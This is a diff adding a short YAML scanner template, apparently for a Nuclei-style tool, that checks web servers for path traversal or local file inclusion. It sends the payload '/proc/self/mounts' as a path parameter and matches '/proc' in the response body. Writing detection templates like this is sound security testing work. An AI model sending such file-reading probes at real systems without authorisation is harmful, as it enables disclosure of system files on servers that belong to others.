@@ -1,0 +1,20 @@
+id: lfi6-0227
+name: 'Traversal in path'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via path'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      path:
+        - '/proc/self/mounts'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '/proc'
